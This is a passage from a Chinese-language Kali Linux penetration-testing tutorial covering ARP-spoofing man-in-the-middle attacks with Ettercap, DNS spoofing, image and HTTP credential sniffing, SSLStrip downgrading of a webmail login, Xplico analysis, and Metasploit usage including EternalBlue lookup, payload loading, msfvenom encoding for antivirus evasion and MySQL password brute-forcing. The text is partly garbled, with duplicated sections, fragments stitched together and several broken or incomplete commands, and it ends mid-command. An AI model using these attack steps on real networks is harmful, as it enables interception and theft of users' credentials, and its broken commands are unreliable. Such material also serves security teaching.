  ```\n\n## B) 使用 Ettercap 启动 ARP 攻击\n\n1) 启动 `dns_spoof` 插件实施 DNS 欺骗。\n\n执行命令如下：\n\
  \n```\nroot@exampleserver:～# ettercap -Tq -M arp:remote -P dns_spoof /192.168.29.139//\
  \ /192.168.29.2//\n```\n\n2) 看到上面的输出信息表示 DNS 欺骗已成功实施。此时，当目标主机访问任何网页时，它将被诱骗进入攻击主机（192.168.29.139）创建的伪页面，即克隆站点。\n\
  \n3) 假设目标用户将访问 `Google`。点击 `http://www.google.com`，将显示所示页面。\n\n4) 可以看到访问页面是登录 `Google`\
  \ 服务器，但地址栏中请求的 URL 仍是 `http://www.google.com/`。此时，当目标用户输入登录信息登录 `Google` 服务器时，登录信息将被攻击主机捕获，捕获的信息将显示在终端上，如下：\n\
  \n```\n192.168.29.135--[18/Apr/2019 16:17:51]\n```\n\n从上面的输出信息可以看出，生成的文件保存在此处（此处原文不完整，通常指路径）。操作将返回\
  \ Webattack 菜单。\n\n\n\n\n# Wireshark，一种通用数据包捕获工具\n\nWireshark 是一种用于网络数据包的工具，可用于捕获和分析数据包。在用户实施中间人攻击后，可以使用\
  \ Wireshark 监控流经网络的目标主机数据包。本节将介绍如何使用 Wireshark 工具捕获数据包。\n\n## 使用 Wireshark 监控目标主机的数据包。\n\
  \n具体步骤如下：\n\n1) 实施中间人攻击。\n\n执行命令如下：\n\n```bash\nroot@exampleserver:～# ettercap -Tq\
  \ -M arp:remote /192.168.29.148// /192.168.29.2//\n```\n\n2) 启动 Wireshark 工具。在菜单栏中，依次选择\
  \ `Applications```|``sniffing/spoofing``|`wireshark` 命令，界面将会显示。\n\n3) 在此界面中选择监听接口\
  \ `eth0`。然后，点击开始捕获组按钮开始捕获数据包。\n\n4) 此时，所有通过接口 `eth0` 的数据包都在被监控。当捕获到足够的数据包时，点击停止捕获组按钮停止捕获数据包。\n\
  \n5) 将捕获的包保存为捕获文件。在菜单栏中选择 `File` `|` `Save` 命令，界面将会显示。\n\n6) 在此界面中指定捕获文件名称和位置。然后，点击\
  \ `Save` 按钮成功保存捕获的数据包。\n\n# 捕获图片\n\n在用户成功实施中间人攻击后，可以使用 driftnet 工具捕获图片。Driftnet\
  \ 是一种简单实用的图像捕获工具，可以轻松捕获网络数据包中的图像。通过与 `ettercap` 工具配合，你可以捕获目标主机浏览的所有图片。本节将介绍如何使用\
  \ driftnet 工具捕获目标机的图片。\n\ndriftnet 工具的语法格式如下：\n\n```bash\ndriftnet [options]\n```\n\
  \n## 使用 driftnet 工具捕获目标主机浏览的所有图片。\n\n具体步骤如下：\n\n1) 使用 Ettercap 实施中间人攻击。\n\n执行命令如下：\n\
  \n```bash\nroot@exampleserver:～# ettercap -Tq -M arp:remote /192.168.29.135// /192.168.29.2//\n\
  ```\n\n看到上述输出信息表示已对目标成功实施了 ARP 欺骗。接下来，用户可以使用 driftnet 工具监控目标主机的图片。\n\n2) 使用 driftnet\
  \ 开始监控目标主机浏览的所有图片，并指定将监控的图片临时保存到 `/root/image` 目录。\n\n执行命令如下：\n\n```bash\nroot@exampleserver:～#\
  \ driftnet -i eth0-d /root/image\n```\n\n执行上述命令后，会弹出一个 driftnet 终端窗口。\n\n3) 当捕获到目标主机浏览的图片时，会在窗口中显示。此外，在\
  \ driftnet 监控的交互模式下也可以看到图像信息。\n\n你可以从上方显示的信息中看到捕获的图片信息。在上面的信息输出中，用户还可以发现一些警告信息。这是由于\
  \ driftnet 工具不支持某些图像格式导致的。\n\n此时，用户进入指定的图片目录，你可以在 `/root/image` 目录下看到所有捕获并保存的图像。用户可以使用图片查看器查看任何图片，显示结果所示。\n\
  \n4) 你可以通过此界面看到捕获的图片。如果用户不想再次捕获图片，按下 `Ctrl+C` 组合键停止监控。\n\n# 第 25 章\n\n## 数据进级监控\n\
  \n## 监控 HTTP 数据\n\nHTTP（超文本传输协议）是一种用于 Web 服务器向本地浏览器传输超文本的传输协议。通常，HTTP 协议被客户端用于访问网页。因此，用户也可以通过中间人攻击监控目标用户访问的\
  \ HTTP 数据。由于 HTTP 协议以明文传输数据，如果用户登录 HTTP 协议网站，用户信息将会被监控。下文将介绍如何使用 Ettercap 工具嗅探 HTTP\
  \ 协议数据。\n\n具体步骤如下：\n\n1) 使用 Ettercap 工具对目标实施中间人攻击。\n\n执行命令如下：\n\n```bash\nroot@exampleserver:～#\
  \ ettercap -Tq -M arp:remote /192.168.29.135// /192.168.29.2//\n```\n\n看到上述输出信息表示\
  \ ARP 欺骗攻击已在目标上成功实施。\n\n2) 此时，当目标主机访问 HTTP 协议网站时，它将由攻击主机监控。\n\n例如，登录此处 UNIX 论坛，当用户输入登录信息并登录时，将由攻击主机监控。如下所示：\n\
  \n```\nHTTP: 42.62.98.167:80->\nUSER: testuser PASS: password\n```\n\n从输出信息中，我们可以看到目标主机访问\
  \ UNIX 论坛的登录信息被监控。用户名是 `testuser`，密码是 `password`。\n\n## 监控 HTTPS 数据\n\nHTTPS（安全超文本传输协议）是\
  \ HTTP 的安全版本。此时，用户可以使用 SSLStrip 工具解密加密数据。下文将介绍如何使用 SSLStrip 工具监控 HTTPS 数据。\n\n具体步骤如下：\n\
  \n1) 开启路由转发。\n\n```bash\nroot@exampleserver:～# echo 1>/proc/sys/ipv4/ip_forward\n\
  ```\n\n2) 通过 iptables 将所有 HTTP 数据导入端口 10000。\n\n```bash\nroot@exampleserver:～# iptables\
  \ -t nat -A PREROUTING -p tcp --destination-port 80-j REDIRECT --to-port 10000\n\
  ```\n\n3) 使用 sslstrip 监控端口 10000 以获取信息。\n\n执行命令如下：\n\n```bash\nroot@exampleserver:～#\
  \ sslstrip -a -l 10000\n```\n\n从输出信息中可以看到 SSLStrip 工具正在运行。此时，当前目录下会创建一个名为 `sslstrip.log`\
  \ 的日志文件。\n\n通过监控日志文件，可以看到目标主机传输的数据：\n\n```bash\nroot@exampleserver:～# tail -f sslstrip.log\n\
  ```\n\n提示：在使用 SSLStrip 进行攻击时，可能会出现一些警告信息。这些这并不影响 SSLStrip 对数据包的捕获。\n\n其中，警告信息显示如下：\n\
  \n```\nUnhandled error in Deferred: Traceback (most recent call last):\n```\n\n\
  4) 实施 ARP 欺骗攻击。\n\n执行命令如下：\n\n```bash\nroot@exampleserver:～# ettercap -Tq -M arp:remote\
  \ /192.168.29.136// /192.168.29.2//\n```\n\n5) 此时，目标主机访问 HTTPS 加密网站。如果目标用户提交敏感信息，将被\
  \ SSLStrip 捕获。例如，登录 126 邮箱（`https://mail.126.com`）来验证 SSLStrip 攻击的成功。当目标用户成功访问 126\
  \ 邮箱时，界面将会显示。\n\n6) 从此界面可以看到 126 邮箱的登录界面已成功显示。此外，你从浏览器地址栏可以看到它已被 SSLStrip 工具解密为\
  \ HTTP 协议（`http://mail.126.com`）。\n\n\n\n\n\n2019-04-19 15:18:51,945 POST Data (passport.126.com):\
  \ server response: HTTP/1.1 200 OK\n\n从上述输出信息中，我们可以看到目标主机访问 `mail.126.com` 网站。此外，你可以看到用户提交的用户名是\
  \ `testuser@126.com`，且密码经过了加密。\n\n# 网络数据快速分析\n\n当用户使用 `Wireshark` 捕获数据包时，可以使用 `Xplico`\
  \ 工具快速分析这些数据。`Xplico` 工具可以快速找出用户请求的网页地址、图片和视频内容。下面将介绍使用 `Xplico` 工具分析网络数据的方法。\n\n\
  # 安装并启动 Xplico 服务\n\nKali Linux 默认没有安装 `Xplico` 工具。因此，在使用该工具之前，你需要先安装该工具。\n\n执行命令如下：\n\
  \n```bash\nroot@exampleserver:～# apt-get install xplico\n```\n\n执行上述命令后，如果没有报告错误，则安装成功。接下来，你需要在在使用之前先启动服务。\n\
  \n执行命令如下：\n\n```bash\nroot@exampleserver:～# service xplico start\n```\n\n执行上述命令后，没有内容输出。因为\
  \ `Xplico` 是一个基于 Web 的工具。因此，用户还需要启动 Web 服务。\n\n执行命令如下：\n\n```bash\nroot@exampleserver:～#\
  \ service apache2 start\n```\n\n现在，用户可以访问 `Xplico` 服务了。`Xplico` 服务的默认监听端口为 `9876`。\n\
  \n用户可以通过检查端口来确定 `Xplico` 服务是否成功启动。详情如下：\n\n```bash\nroot@exampleserver:～# netstat\
  \ -anptul | grep 9876\ntcp6 0 0 :::9876\n```\n\n从上述输出信息中，我们可以看到 TCP 端口 `9876` 正在监听。这说明\
  \ `Xplico` 服务启动成功。\n\n具体步骤如下：\n\n1) 在浏览器中访问 `http://IP:9876/` 进入 `Xplico` 服务器。访问成功后，将显示\
  \ `Xplico` 服务的登录界面。\n\n2) 此界面用于登录 `Xplico` 服务。`Xplico` 服务的默认用户名和密码均为 `xplico`。在输入用户名和密码成功登录\
  \ `Xplico` 后，将显示所示界面。\n\n3) 你可以从此界面看到没有任何内容。默认情况下，`Xplico` 服务没有案件（case）和会话（session）。你需要在分析捕获文件之前创建一个案件和会话。首先创建一个案件，在左栏选择\
  \ `New Case` 选项即可显示界面。\n\n4) 这里提供了两种分析数据的选项，即 `Uploading PCAP capture file/s` 和\
  \ `Live acquisition`。其中，`Uploading PCAP capture file/s` 意味着上传 `PCAP` 捕获文件并进行分析。`Live\
  \ acquisition` 意味着实时在线捕获并分析数据包。在这里我们要分析捕获的数据包，请选择 `Uploading PCAP capture file/s`\
  \ 单选按钮。然后指定案件名称。在本例中，将案件名称设置为 `TCP`，然后点击 `Create` 按钮，将显示界面。\n\n5) 从此界面，你可以看到案件已成功创建，新创建的案件显示在列表中。点击新创建的案件名称\
  \ `TCP` 即可查看案件中的会话。\n\n6) 从此界面，你可以看到没有任何会话信息，然后创建一个会话。在左栏选择 `New Session` 命令即可显示界面。\n\
  \n7) 在此界面的 `Session name` 框中输入你想创建的会话名称，然后点击 `Create` 按钮创建会话。创建成功后，将显示界面。\n\n8)\
  \ 从此界面，你可以看到创建了一个名为 `Web` 的新会话。现在进入会话，可以加载并分析捕获文件。点击会话名称 `Web`，将显示所示界面。\n\n9) 此界面用于显示捕获文件的详细信息。由于尚未上传捕获文件，请点击\
  \ `Select File` 按钮选择要分析的捕获文件，然后点击 `Upload` 按钮上传捕获文件。上传成功后，将显示界面。\n\n10) 从界面的 `Session\
  \ Data` 部分，你可以看到上传的捕获文件的时间状态。从 `Status` 行信息中，可以看到 `DECODING COMPLETED`（解码完成）。此外，你现在将看到与捕获文件对应的每类型数据包的数量。界面显示了\
  \ 15 类型，例如 `HTTP`、`MMS`、`Emails`、`FTP-TFTP-HTTP file`、`Web Mail` 等。在此界面中，你可以看到 `HTTP`\
  \ 类型显示了某些数据包信息。例如，查看访问站点的信息。在左栏选择 `Web|Site` 命令，将显示捕获文件中请求的所有链接。\n\n11) 在此界面，默认显示\
  \ `Html` 类型的 `HTTP` 信息。用户还可以查看图片（`Image`）、视频（`Video`）以及请求链接中的 `Flash` 动画。例如，打开请求的网页。\n\
  \n12) 从此界面，你可以看到用户播放的视频。例如，查看请求的缩略图。在左栏选择 `Web|Images` 命令即可查看所有图片。\n\n\n\n\nMetasploit\
  \ 框架的威力在于它提供了大量的渗透测试模块和插件。这些模块根据不同的用途分为 7 类，即 `Exploits`（渗透攻击模块）、`Auxiliary`（辅助模块）、`Post`（渗透后攻击模块）、`Payloads`（攻击载荷模块）、`Encoders`（编码模块）、`Nops`（空指令模块）和\
  \ `Evasion`（规避模块）。下面将介绍这 7 类模块和插件的功能。\n\n### 1) 渗透攻击模块\n\n渗透攻击模块主要利用发现的安全漏洞或配置弱点对目标系统进行攻击，植入并运行攻击载荷，从而获取目标系统的控制权限。Metasploit\
  \ 框架中的渗透攻击模块可以根据安全漏洞的位置分为主动渗透攻击和被动渗透攻击。\n\n其中，这两种攻击的区别如下：\n\n**主动渗透攻击：**\n被利用的安全漏洞位于网络服务器软件以及由该服务器软件承载的上层应用中。因为这些服务通常会在主机上开启一些监听端口并等待客户端连接。通过连接到目标系统的网络服务，注入某些特殊构造的、包含“恶意”攻击数据的网络请求内容，触发安全漏洞，并导致远程服务器执行“恶意”数据中包含的攻击载荷，从而获取目标系统的权限。\n\
  \n**被动渗透攻击：**\n被利用的漏洞位于客户端软件（如浏览器、浏览器插件、邮件客户端、Office 和 Adobe 等文档编辑软件）。对于此类安全漏洞，渗透测试人员无法从远程向客户端软件输入数据，因此只能使用被动渗透攻击。\n\
  \n常用的被动渗透攻击包括构造“恶意”网页、电子邮件或文档文件，通过建立包含此类恶意内容的服务器、发送邮件附件、结合社会工程攻击分发、结合网络欺骗和劫持技术等手段，诱导目标用户在目标系统上打开或访问这些恶意内容，从而触发客户端软件的安全漏洞，获取控制目标系统的\
  \ `Shell` 会话。\n\n### 2) 辅助模块\n\n辅助模块包括各种网络服务的扫描和检测、构建伪服务以收集登录密码、密码破解等模块。此外，辅助模块还包括某些不需要加载的攻击载荷。这些模块用于获取目标系统的远程控制，例如拒绝服务攻击。\n\
  \n### 3) 渗透后攻击模块\n\n渗透后攻击模块主要用于获取目标系统的远程控制。在控制系统中执行各种渗透后攻击，如获取敏感信息、进一步扩展以及实现跳板攻击。\n\
  \n### 4) 攻击载荷模块\n\n攻击载荷是一段在成功渗透攻击后提示目标系统运行的嵌入代码。其通常功能是在目标系统上为渗透攻击者开启控制会话连接。在传统的渗透代码开发中，攻击载荷只是一个简单的\
  \ `ShellCode` 代码，用汇编语言编译并转换为目标系统 CPU 架构支持的机器码。\n\n在渗透攻击触发漏洞后，程序执行流被劫持并跳转到这段代码执行，从而完成\
  \ `ShellCode` 中的单项功能。Metasploit 攻击载荷分为三种类型：Single（独立型）、Stager（传输器）和 Stage（传输体）。\n\
  \n这三种攻击载荷类型的区别如下：\n\n*   **Single**：它是完全独立的载荷，使用起来就像运行 `calc.exe` 一样简单，例如添加系统用户或删除文件。由于\
  \ Single Payloads 是完全独立的，它们可能会被 `netcat` 等非 Metasploit 处理工具捕获。\n*   **Stager**：该载荷负责在目标用户和攻击者之间建立网络连接，并下载额外的组件或应用程序。常见的\
  \ Stager Payload 是 `reverse_tcp`，它允许目标系统与攻击者建立 TCP 连接，允许目标系统主动连接到渗透测试人员的端口（反向连接）。另一个常用的是\
  \ `bind_tcp`，它允许目标系统开启 TCP 监听器，攻击者可以随时与目标系统通信（正向连接）。\n*   **Stage**：它是 Stager Payload\
  \ 下的一种 Payload 组件，这种 Payload 可以提供更高级的功能，且没有大小大小限制。\n\n### 5) 空指令模块\n\n空指令（`NOP`）是一些无操作或与操作无关的指令，它们不会对程序的运行状态产生任何实质性影响。最典型的无指令是无操作。在\
  \ X86 架构平台上的操作码为 `0x90`。\n\n当渗透攻击构造恶意数据缓冲区时，通常需要在要执行的 shell code 之前添加一个空指令区域。这样，当渗透攻击触发并执行\
  \ `ShellCode` 时，就会有一个更大的安全落地区域，从而避免因内存地址随机化和返回地址计算偏差导致的 `ShellCode` 执行失败，提高渗透攻击的可靠性。\n\
  \n### 6) 编码模块\n\n在攻击载荷和空指令模块组装完成指令序列后，Metasploit 框架在渗透攻击模块将指令添加到恶意数据缓冲区并发送到目标系统运行之前需要进行编码。编码模块有两个主要功能：第一，确保攻击载荷中不会出现“坏字符”；第二是“释放”攻击载荷，即规避杀毒软件、IDS\
  \ 入侵检测系统和 IPS 入侵预防系统的检测与阻断。\n\n### 7) 规避模块\n\n规避模块是 Metasploit 5 新增的。用户可以使用规避模块规避\
  \ Windows 防火墙。Windows Defender 是现在随 Windows 系统的防火墙工具，它不仅可以扫描系统，还能监控系统。8. 插件可以扩展框架的功能，也可以将现有功能封装成高级功能组件。插件可以用于集成一些外部安全工具，如\
  \ Nessus、OpenVAS 漏洞扫描器等。\n\n# 第 27 章：理解 Metasploit 接口\n\n![](img/image_rsrc49Z.jpg)\n\
  \nMetasploit 框架提供了两种接口：图形界面和终端模式。以前还提供命令行模式接口，但已废弃。下面将介绍 Metasploit 图形界面和终端模式启动方法。\n\
  \n### 1) Metasploit 的图形界面（Armitage）\n\nArmitage 是一个用 Java 编写的 Metasploit 图形界面攻击软件。它可以结合\
  \ Metasploit 中知的漏洞对主机漏洞进行自动化攻击。下面将介绍如何使用 Armitage。\n\n具体步骤如下：\n\n1.  在图形界面中，依次选择“Applications”|“Vulnerability\
  \ Exploitation Tool Set”|`armitage` 命令启动 Armitage 工具。\n\n\n\n\n## 简介\n\n2) 此对话框显示连接到\
  \ Metasploit 服务的 Basic 信息。点击 `Connect` 按钮将显示此对话框。 ￼\n\n3) 此对话框提示是否启动 Metasploit\
  \ 的 RPC 服务。点击 `Yes (Y)` 按钮将显示此对话框。 ￼\n\n4) 此对话框显示连接到 Metasploit 的进度。当成功连接到 Metasploit\
  \ 服务后，将显示界面。 ￼\n\n5) 如果你看到此界面，意味着 Armitage 工具已成功启动。接下来，用户可以使用该工具实现渗透测试。此界面包含 3 部分，分别标记为\
  \ A、B 和 C。\n\n* 部分 A：显示预配置的模块。用户可以在模块列表中使用空格键搜索提供的模块。 ·\n* 部分 B：显示活跃的目标系统，用户可以执行漏洞攻击。\
  \ ·\n* 部分 C：显示多个 Metasploit 标签（tags）。通过这种方式，你可以同时运行多个 Meterpreter 命令或控制台会话并同时显示它们。\n\
  \n例如，为了在目标主机上实现 Nmap Ping 扫描，你可以依次选择 `Hosts|Nmap Scan|Ping Scan` 命令。\n\n6) 在此界面上选择\
  \ `Ping Scan` 命令后，你就可以对目标主机执行 Ping 扫描。\n\n## Metasploit 终端 Msfconsole\n\nMSF 终端\
  \ (`Msfconsole`) 目前是 Metasploit 框架中最流行的用户界面，MSF 终端是 Metasploit 框架中最灵活、功能最丰富且支持最好的工具之一。MSF\
  \ 终端提供了一个站式接口，可以设置 Metasploit 框架中的几乎每一个选项和配置。用户可以使用 MSF 终端执行任何操作，包括启动渗透攻击、加载辅助模块、执行枚举、创建监听器或对整个网络执行自动化渗透攻击。下文将介绍\
  \ Metasploit 的终端模式。\n\n### 启动 Metasploit 终端模式\n\n执行命令如下： ￼\n\n```\nroot@exampleserver:～#\
  \ msfconsole\n```\n\n执行上述命令后，你就可以成功启动 Metasploit 的终端模式。\n\n```\nmsf5>\n```\n\n看到命令行提示符为\
  \ `msf 5>`，意味着 Metasploit 的终端模式已成功启动。从输出信息中，你可以看到支持攻击模块及其对应的数量。\n\n例如，有 2343 个渗透攻击加载模块、1923\
  \ 个辅助模块、328 个后渗透攻击模块、546 个攻击加载模块、44 个编码模块、10 个空命令模块和 2 个逃逸模块。接下来，用户可以使用这些 payload\
  \ 进行渗透测试。\n\n## 初始化 Metasploit\n\n在 Kali Linux 中，Metasploit 主要使用 PostgreSQL 数据库存储数据。因此，在使用\
  \ Metasploit 框架时，你需要启动 PostgreSQL 数据库。\n\n执行命令如下： ￼\n\n```\nroot@exampleserver:～#\
  \ service postgresql start\n```\n\n此外，启动 PostgreSQL 数据库后，你还需要使用 `msfdb init` 命令来创建并初始化数据库。\n\
  \n执行命令如下： ￼\n\nroot@exampleserver:～# msfdb init\n```\n\n### 初始化数据库 创建初始数据库架构\n\n\
  从上述输出信息中，你可以看到 `msf` 和 `msf_test` 数据库已自动创建。此外，数据库配置文件 `database.yml` 也已创建。\n\n提示：如果当前系统已经初始化了\
  \ Metasploit，它会提示数据库已配置，如下：`Metasploit running on Kali Linux as root, using system\
  \ database` A database appears to be already configured, skipping initialization\n\
  \n### 创建工作区 (Workspace)\n\n为了区分不同的扫描任务，可以创建多个工作区来保存不同扫描的的信息。其中，不同工作区之间的信息相互独立，以避免数据混淆。\n\
  \n创建工作区的语法格式如下： ￼\n\n```\nworkspace -a [name]\n```\n\n在上述语法中，`-a` 选项意味着添加一个工作区。\n\
  \n### 创建名为 test 的工作区。\n\n具体步骤如下：\n\n1) 检查当前工作区。\n\n执行命令如下： ￼\n\n```\nmsf5> workspace\
  \ default\n```\n从输出信息中可以看到，默认情况下只有一个默认工作区。此外，该工作区当前正在使用。\n\n2) 创建一个新的工作区。\n\n执行命令如下：\
  \ ￼\n\n```\nmsf5> workspace -a test\n```\n[*] Created workspace test\nChanging context\
  \ to test\n从输出信息中可以看到，工作区已创建。此外，该工作区当前正在使用。\n\n3) 查看当前工作区。\n\n执行命令如下： ￼\n\n```\n\
  msf5> workspace test\n```\n从输出信息中可以看到，当前工作区为 test。\n\n4) 到默认工作区。\n\n执行命令如下： ￼\n\n\
  ```\nmsf5> workspace default\n```\n[*] Switching context to default\nChanging context\
  \ to default\n从输出信息中可以看到，已切换到默认工作区。\n\n\n\n\n从输出信息中，我们可以看到扫描报告中有 3 个主机。其中，地址分别为\
  \ `192.168.29.223`、`192.168.29.225` 和 `192.168.29.127`。\n\n2) 使用 `vulns` 命令查看漏洞信息。\n\
  \n执行命令如下：\n\n```\nmsf5> vulns\n```\n\n接下来，用户可以通过 `Name`（`Name`）或引用信息（`References`）来搜索可使用的攻击载荷（payload）。\n\
  \n### 手动查找攻击载荷\n\n在用户确定目标系统的漏洞后，他们可以在 Metasploit 中搜索渗透测试模块，选择可以利用这些漏洞的模块，然后实施渗透测试。以下将介绍如何使用\
  \ `search` 命令手动查找渗透测试模块。\n\n查找渗透测试模块的语法格式如下：\n\n```\nsearch [options]\n```\n\n在\
  \ `search` 语句中，`options`意味着可用选项；`keywords`意味着关键词。接下来，我们将手动查找 `2020` 年的漏洞。\n\n执行命令如下：\n\
  \n```\nmsf5> search cve:2020\n```\n\n从输出信息中，我们可以看到所有出的渗透测试模块。输出包含几列：`Name`、`Disclosure\
  \ Date`、`Rank`、`Check` 和 `Description`。\n\n在 `search` 语句中，我们可以搜索带有 `RCE` 的漏洞 `ms17-010`。\n\
  \n执行命令如下：\n\n```\nmsf5> search name:ms17-010\n```\n\n从输出信息中，我们可以看到找到了 `eternalblue`\
  \ 的渗透测试模块。此时，用户可以选择 `exploit/windows/smb/eternalblue` 来实施渗透测试。\n\n```\nmsf5> use\
  \ exploit/windows/smb/eternalblue\n```\n\n### 第三方模块\n\n如果用户在 Metasploit 中没有找到所需的模块，也可以从第三方网站（如\
  \ `exploitdb`）中查找。以下描述了如何手动将这些模块导入到 Metasploit 中。\n\n1) 通过漏洞网站查找\n\n漏洞网站的地址为 `https://www.exploitdb.com/`。在浏览器中成功访问该网站后，将显示界面。用户可以通过\
  \ `CVE ID`、`name` 或 `type` 搜索漏洞。\n\n从搜索结果中，可以看到攻击模块信息。输出包含几列：`Name`、`Disclosure\
  \ Date`、`Platform`、`Check` 和 `Description`。\n\n2) 将模块文件 `webtest.rb` 拷贝到 Metasploit\
  \ 的相应位置。Metasploit 模块的默认位置是 `/root/.msf4/modules`。为了方便组织模块，用户可以根据类型创建文件夹。\n\n```bash\n\
  root@exampleserver:～# mkdir /root/.msf4/modules/exploits\n```\n\n执行上述命令后，没有输出。为了方便记忆位置，我们进入该目录并将攻击载荷文件拷贝进去。\n\
  \n```bash\nroot@exampleserver:～# cd /root/.msf4/modules/exploits/\nroot@exampleserver:exploits##\
  \ cp webtest.rb .\n```\n\n3) 重启 Metasploit 工具以查看加载的渗透测试攻击模块。\n\n```bash\nroot@exampleserver:～#\
  \ msfconsole\nmsf5>\n```\n\n从上面显示的信息中，我们可以看到 exploit 类模块已从 `1873` 变为 `1874`。这说明模块已成功导入。\n\
  \n\n\n从输出信息中，我们可以看到目标主机地址已设置为 `192.168.29.227`。\n\n# 第 29 章\n\n## 使用 Metasploit\
  \ 进行攻击\n\n![](img/image_rsrc49Z.jpg)\n\n## 执行攻击\n\n在用户找到可以利用漏洞的渗透测试模块后，即可进行攻击。为了执行进一步的攻击，用户还可以加载攻击载荷（`Payload`）。然后配置攻击载荷并实施攻击。本节将介绍实施攻击的方法。\n\
  \n### 加载攻击载荷\n\n攻击载荷是上述的 `Payload`模块。通过加载攻击载荷，可以实现进一步的攻击，例如获取 Shell 和远程执行命令。下面将介绍加载攻击载荷的方法。\n\
  \n加载攻击载荷的语法格式如下：\n\n```\nset payload\n```\n\n在上述语法中，参数 `payload` 名称表示攻击载荷的名称。\n\n\
  ### 为 webtest 加载攻击载荷\n\n所示上方导入的渗透测试模块。具体步骤如下：\n\n1) 启动并选择 webtest 渗透测试模块，如下：\n\n\
  ```\nroot@exampleserver:～# msfconsole\nmsf5> use exploit/test/webtest\nmsf5 exploit(test/webtest)>\n\
  ```\n\n2) 查看可以加载的载荷。\n\n执行命令如下：\n\n```\nmsf5 exploit(test/webtest)> show payloads\n\
  ```\n\n从输出信息中可以看出，系统显示了当前渗透测试模块的所有可用载荷。输出信息总共显示了 6 列信息，分别表示 #（载荷编号）、`Name`（名称）、`Disclosure\
  \ Date`（发布日期）、`Rank`（级别）、`Check`（支持检测）和 `Description`（描述信息）。例如，加载一个 PHP 执行命令载荷，即\
  \ `php/exec`。\n\n3) 加载攻击载荷。\n\n执行命令如下：\n\n```\nmsf5 exploit(test/webtest)> set payload\
  \ php/exec\npayload => php/exec\n```\n\n从输出信息中，我们可以看到加载了名为 `php/exec` 的攻击载荷。\n\n\
  ### 配置攻击载荷\n\n用户加载攻击载荷后，还需要对其进行配置，并设置需要配置的参数选项。下面描述了如何配置攻击载荷。以下将以 `php/exec` 为例介绍配置攻击载荷的方法。\n\
  \n1) 使用 `show options` 命令查看可配置选项。\n\n执行命令如下：\n\n```\nmsf5 exploit(test/webtest)>\
  \ show options\n```\n\n从输出信息中，你可以看到它包含了模块选项、攻击加载选项和可用的目标选项。此时，用户可以设置这些选项。\n\n2)\
  \ 设置攻击载荷的 `CMD` 选项，如下：\n\n```\nmsf5 exploit(test/webtest)> set CMD dir\nCMD => dir\n\
  ```\n\n从输出信息中可以看出，`Payload` 选项的 `CMD` 值已设置为 `dir`。接下来，你可以攻击目标。\n\n3) 实施攻击。\n\n执行命令如下：\n\
  \n```\nmsf5 exploit(test/webtest)> exploit\n```\n\n## 设置架构\n\n某些渗透测试模块可能支持多种系统架构。在正常情况下，支持多种系统架构的渗透测试模块默认是自动的。当用户发起攻击时，渗透测试模块将自动选择架构。\n\
  \n用户也可以手动设置架构。下面将介绍该方法。\n\n具体步骤如下：\n\n1) 启动并选择 webtest 渗透测试模块，如下：\n\n```\nroot@exampleserver:～#\
  \ msfconsole\nmsf5> use exploit/test/webtest\nmsf5 exploit(test/webtest)>\n```\n\
  \n2) 查看可以加载的载荷。\n\n执行命令如下：\n\n```\nmsf5 exploit(test/webtest)> show payloads\n```\n\
  \n从输出信息中可以看出，系统显示了当前渗透测试模块的所有可用载荷。输出信息总共显示了 6 列信息，分别表示 #（载荷编号）、`Name`（名称）、`Disclosure\
  \ Date`（发布日期）、`Rank`（级别）、`Check`（支持检测）和 `Description`（描述信息）。例如，加载一个 PHP 执行命令载荷，即\
  \ `php/exec`。\n\n3) 加载攻击载荷。\n\n执行命令如下：\n\n```\nmsf5 exploit(test/webtest)> set payload\
  \ php/exec\npayload => php/exec\n```\n\n从输出信息中，我们可以看到加载了名为 `php/exec` 的攻击载荷。\n\n\
  ### 配置攻击载荷\n\n用户加载攻击载荷后，还需要对其进行配置，并设置需要配置的参数选项。下面描述了如何配置攻击载荷。以下将以 `php/exec` 为例介绍配置攻击载荷的方法。\n\
  \n1) 使用 `show options` 命令查看可配置选项。\n\n执行命令如下：\n\n```\nmsf5 exploit(test/webtest)>\
  \ show options\n```\n\n从输出信息中，你可以看到它包含了模块选项、攻击加载选项和可用的目标选项。此时，用户可以设置这些选项。\n\n2)\
  \ 设置攻击载荷的 `CMD` 选项，如下：\n\n```\nmsf5 exploit(test/webtest)> set CMD dir\nCMD => dir\n\
  ```\n\n从输出信息中可以看出，`Payload` 选项的 `CMD` 值已设置为 `dir`。接下来，你可以攻击目标。\n\n3) 实施攻击。\n\n执行命令如下：\n\
  \n```\nmsf5 exploit(test/webtest)> exploit\n```\n\n### 设置编码\n\n为了避免出现坏字符，或者为了避免被目标上的防火墙或反病毒软件拦截，你可以设置攻击加载编码来生成新的攻击载荷。其中，编码模块主要由\
  \ `msfvenom` 工具使用。`msfvenom` 是一个支持 MSF 框架的攻击载荷生成器。\n\n其中，用于生成攻击载荷的语法格式如下：\n\n```\n\
  msfvenom [options]<var=val>\n```\n\n使用 `x86/shikata_ga_nai` 编码格式生成新的攻击载荷并将其保存为 `msf.exe`。\n\
  \n方法如下：\n\n1) 查看所有支持的编码。\n\n执行命令如下：\n\n```\nroot@exampleserver:～# msfvenom -l encoders\n\
  ```\n\n2) 创建攻击载荷。\n\n执行命令如下：\n\n```\nroot@examplserver:～# ./msfvenom -p windows/meterpreter/bind_tcp\
  \ RHOST=192.168.227\n```\n\n从上面的输出信息中，我们可以看到使用 `x86/shikata_ga_nai` 编码成功创建了攻击载荷。其中，攻击载荷文件为\
  \ `msf.exe`。\n\n实战攻击场景\n\n针对 MySQL 数据库服务的渗透攻击\n\n\n\nMySQL 是一个关系型数据库管理系统。在 Web 服务器应用方面，MySQL\
  \ 数据库通常是用户的最佳选择。如果管理员配置不当，可能会存在漏洞，例如弱密码、用户权限配置错误等。此时，渗透测试人员可以尝试对其进行渗透测试。在 MSF 控制终端中，提供了一个辅助模块\
  \ `mysql_login`，可用于破解弱密码。下面将介绍如何使用该模块对 MySQL 数据库服务实施渗透测试。\n\n### 使用 `mysql_login`\
  \ 模块渗透 MySQL 数据库服务\n\n具体步骤如下：\n\n1) 使用 `mysql_login` 模块。\n\n执行命令如下：\n\n```\nmsf5>\
  \ use auxiliary/scanner/mysql/mysql_login\nmsf5 auxiliary(scanner/mysql/mysql_login)>\n\
  ```\n\n2) 查看模块配置选项。\n\n执行命令如下：\n\n```\nmsf5 auxiliary(scanner/mysql/mysql_login)>\
  \ show options\n```\n模块选项 (`auxiliary/scanner/mysql/mysql_login`)):\n\n从输出信息中，你可以看到所有的配置选项参数。其中有几个选项是必须配置的。接下来将进行配置。\n\
  \n3) 配置模块选项参数。\n\n执行命令如下：\n\n```\nmsf5 auxiliary(scanner/mysql/mysql_login)> set\
